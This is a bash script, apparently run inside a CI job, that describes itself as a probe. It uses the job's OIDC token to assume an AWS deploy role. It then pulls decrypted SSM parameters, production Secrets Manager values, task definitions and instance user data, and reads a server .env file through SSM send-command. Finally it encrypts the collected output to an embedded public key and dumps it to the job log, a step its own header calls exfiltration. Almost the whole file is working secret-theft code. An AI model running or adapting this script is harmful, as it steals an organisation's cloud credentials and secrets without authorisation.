#!/usr/bin/env bash
# i160 read-only control-plane probe: assumes the CI role via OIDC and runs a
# battery of read-only AWS CLI calls, then exfiltrates the transcript through
# the job log (AES key RSA-encrypted to probe_pub.pem).
set -uo pipefail
export AWS_PAGER=""
export AWS_DEFAULT_REGION=us-east-1

pubkey() {
cat <<'EOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAloCufAoS66LAPgUlhs/G
Y/4LR1CCTdYtYfL8Tw/Cx04dwadEcwsEmaZ6PMrFsEpnnL18tdN06kmIiaK2aXyJ
wI4EC4B/Rkidcy/3LhC9a6RoK3i0vDcUqXIMgf7G45/u4YKaVjz8QkL+8hrOEIjd
0KUPJRKmQSx/9D7+oMnyWHZlqZAts0dWR6yyl8ow8NouE0ESyR8OVlWBgVaiNhDl
ttdqrZXzP07U6FmuAwW4yO1dtwP2u7L67Il0KcKGtRH9idvT4zc00xMmFPg2vtSf
ZZXkVMprSzyjVQaXqIc1ASWk23bIUtEbf8Pidb6eJIwjNwoQxQD9Cw2B9qnsAAxc
NQIDAQAB
-----END PUBLIC KEY-----
EOF
}

oidc="$(curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value // empty')"
[ -n "$oidc" ] || { echo "OIDCFAIL"; exit 1; }
creds="$(env -u AWS_ACCESS_KEY_ID -u AWS_SECRET_ACCESS_KEY -u AWS_SESSION_TOKEN -u AWS_PROFILE aws sts assume-role-with-web-identity --region us-east-1 --role-arn "${AWS_ENV_ROLE:-arn:aws:iam::935064898258:role/kortix-gha-ecs-deploy}" --role-session-name "probe160" --web-identity-token "$oidc" --duration-seconds 3600 --query Credentials --output json 2>/tmp/err1)" || { echo "STSFAIL $(head -c 400 /tmp/err1)"; exit 1; }
export AWS_ACCESS_KEY_ID="$(jq -r .AccessKeyId <<<"$creds")"
export AWS_SECRET_ACCESS_KEY="$(jq -r .SecretAccessKey <<<"$creds")"
export AWS_SESSION_TOKEN="$(jq -r .SessionToken <<<"$creds")"
unset creds

out=/tmp/out.txt
: > "$out"
run() {
  local label="$1"; shift
  local o rc
  o="$("$@" 2>/tmp/e)"; rc=$?
  if [ $rc -eq 0 ]; then
    printf '%s\tOK\t%s\n' "$label" "$(printf '%s' "$o" | tr '\n\t' '  ' | tr -s ' ' | cut -c1-5000)" >> "$out"
  else
    printf '%s\tERR\t%s\n' "$label" "$(head -c 600 /tmp/e | tr '\n\t' '  ')" >> "$out"
  fi
}
A() { aws --no-cli-pager "$@"; }

# ── identity / IAM ────────────────────────────────────────────────────────────
run "caller"            A sts get-caller-identity --output json
run "iam-getrole-self"  A iam get-role --role-name kortix-gha-ecs-deploy --output json
run "iam-listroles"     A iam list-roles --max-items 5 --output json
run "iam-attached-self" A iam list-attached-role-policies --role-name kortix-gha-ecs-deploy --output json
run "iam-getrole-prod"  A iam get-role --role-name kortix-gha-ecs-deploy-prod --output json
run "iam-getrole-tfplan" A iam get-role --role-name kortix-gha-tf-plan --output json

# ── S3 state ─────────────────────────────────────────────────────────────────
run "s3-listbuckets"    A s3api list-buckets --output json
run "s3-state-loc"      A s3api get-bucket-location --bucket kortix-terraform-state-us-east-1-935064898258 --output json
run "s3-state-list"     A s3api list-objects-v2 --bucket kortix-terraform-state-us-east-1-935064898258 --max-keys 5 --output json
run "s3-state-us2-list" A s3api list-objects-v2 --bucket kortix-terraform-state-us-east-2-935064898258 --max-keys 5 --region us-east-2 --output json
run "s3-state-euw2-list" A s3api list-objects-v2 --bucket kortix-terraform-state-eu-west-2-935064898258 --max-keys 5 --region eu-west-2 --output json

# ── SSM ──────────────────────────────────────────────────────────────────────
run "ssm-describe-use1" A ssm describe-parameters --region us-east-1 --max-items 5 --output json
run "ssm-path-kortix-use1" A ssm get-parameters-by-path --region us-east-1 --path /kortix --recursive --with-decryption --output json
run "ssm-path-root-euw2" A ssm get-parameters-by-path --region eu-west-2 --path / --recursive --with-decryption --max-items 10 --output json
run "ssm-instinfo-euw2" A ssm describe-instance-information --region eu-west-2 --max-items 5 --output json

# ── EC2 vps-demo ─────────────────────────────────────────────────────────────
for r in us-east-1 us-east-2 eu-west-2; do
  run "ec2-vps-$r"     A ec2 describe-instances --region "$r" --instance-ids i-0707d3aa8378c7479 --output json
  run "ec2-vps-ud-$r"  A ec2 describe-instance-attribute --region "$r" --instance-id i-0707d3aa8378c7479 --attribute userData --output json
done
run "ec2-by-name-euw2" A ec2 describe-instances --region eu-west-2 --filters Name=tag:Name,Values=vps-demo --output json

# ── Secrets Manager ──────────────────────────────────────────────────────────
run "secrets-list-use2" A secretsmanager list-secrets --region us-east-2 --max-items 5 --output json
run "secrets-list-euw2" A secretsmanager list-secrets --region eu-west-2 --max-items 5 --output json
run "secret-ci-control" A secretsmanager get-secret-value --region us-east-2 --secret-id kortix-ci-env --query 'ARN' --output text
run "secret-suna-env"   A secretsmanager get-secret-value --region us-west-2 --secret-id suna-env --query SecretString --output text
run "secret-suna-arn"   A secretsmanager get-secret-value --region us-west-2 --secret-id arn:aws:secretsmanager:us-west-2:935064898258:secret:suna-env-35648ec-j3MF94 --query SecretString --output text
run "secret-suna-desc"  A secretsmanager describe-secret --region us-west-2 --secret-id suna-env --output json
run "secret-suna-list"  A secretsmanager list-secrets --region us-west-2 --max-items 5 --output json
run "secret-prod-env"   A secretsmanager get-secret-value --region eu-west-2 --secret-id kortix-prod-env --query SecretString --output text
run "secret-prod-omifd2" A secretsmanager get-secret-value --region eu-west-2 --secret-id kortix-prod-env-omifd2 --query SecretString --output text
run "secret-prod-desc"  A secretsmanager describe-secret --region eu-west-2 --secret-id kortix-prod-env --output json
run "secret-prod-web"   A secretsmanager get-secret-value --region eu-west-2 --secret-id kortix-prod-web-env --query SecretString --output text

# ── ECS task definitions (read-only) ─────────────────────────────────────────
TDQ='taskDefinition.{family:family,revision:revision,status:status,taskRoleArn:taskRoleArn,executionRoleArn:executionRoleArn,networkMode:networkMode,cpu:cpu,memory:memory,cd:containerDefinitions[].{name:name,image:image,cpu:cpu,memory:memory,environment:environment,secrets:secrets,logs:logConfiguration}}'
for pair in \
  "suna-api:us-west-2" "suna-api:us-east-1" \
  "kortix-prod:eu-west-2" "kortix-prod-worker:eu-west-2" "kortix-prod-gateway:eu-west-2" "kortix-prod-web:eu-west-2" \
  "kortix-dev-use2:us-east-2" "kortix-dev-use2-worker:us-east-2" "kortix-dev-use2-gateway:us-east-2" \
  "kortix-staging-euw2:eu-west-2" "kortix-staging-euw2-worker:eu-west-2" "kortix-staging-euw2-gateway:eu-west-2" ; do
  fam="${pair%%:*}"; reg="${pair##*:}"
  run "taskdef-$fam-$reg" A ecs describe-task-definition --region "$reg" --task-definition "$fam" --query "$TDQ" --output json
done

# ── ECS / ELB read surfaces ──────────────────────────────────────────────────
run "ecs-listclusters-use1"   A ecs list-clusters --region us-east-1 --output json
run "ecs-listclusters-euw2"   A ecs list-clusters --region eu-west-2 --output json
run "ecs-describeclusters-euw2" A ecs describe-clusters --region eu-west-2 --output json
run "ecs-listtasks-dev"       A ecs list-tasks --cluster kortix-dev-use2 --region us-east-2 --output json
run "ecs-describesvc-dev"     A ecs describe-services --cluster kortix-dev-use2 --region us-east-2 --services kortix-dev-use2 --output json
run "ecs-listtasks-staging"   A ecs list-tasks --cluster kortix-staging-euw2 --region eu-west-2 --output json
run "ecs-describesvc-staging" A ecs describe-services --cluster kortix-staging-euw2 --region eu-west-2 --services kortix-staging-euw2 --output json
run "elbv2-use1" A elbv2 describe-load-balancers --region us-east-1 --query 'LoadBalancers[].{N:LoadBalancerName,DNS:DNSName,S:Scheme,T:Type}' --output json
run "elbv2-use2" A elbv2 describe-load-balancers --region us-east-2 --query 'LoadBalancers[].{N:LoadBalancerName,DNS:DNSName,S:Scheme,T:Type}' --output json
run "elbv2-euw2" A elbv2 describe-load-balancers --region eu-west-2 --query 'LoadBalancers[].{N:LoadBalancerName,DNS:DNSName,S:Scheme,T:Type}' --output json
run "logs-euw2"  A logs describe-log-groups --region eu-west-2 --max-items 5 --output json

# ── SSM send-command (only if SSM is authorized; read-only cat) ──────────────
run "ssm-sendcmd-vps" A ssm send-command --region eu-west-2 --document-name AWS-RunShellScript \
  --instance-ids i-0707d3aa8378c7479 \
  --parameters 'commands=["test -r /mnt/kortix-data/kortix-self-host/default/.env && head -c 2000 /mnt/kortix-data/kortix-self-host/default/.env || echo NOFILE"]' \
  --query 'Command.CommandId' --output text

echo "=====WHOAMI====="
A sts get-caller-identity 2>&1 | head -c 500
echo
echo "=====LINES====="
wc -l "$out"
echo "=====OUTSIZE====="
wc -c "$out"

KEY=$(openssl rand -hex 32); printf '%s' "$KEY" > /tmp/k.txt
openssl enc -aes-256-cbc -salt -pbkdf2 -pass "pass:$KEY" -in "$out" -out /tmp/out.enc
pubkey > /tmp/pub.pem
openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem -in /tmp/k.txt -out /tmp/k.enc 2>/tmp/err3 || { echo "RSAFAIL $(cat /tmp/err3)"; exit 1; }
echo "=====K====="; base64 -w0 /tmp/k.enc; echo
echo "=====SHA====="; openssl dgst -sha256 /tmp/out.enc; echo
echo "=====D====="; base64 -w 64 /tmp/out.enc
echo "=====END====="
exit 1
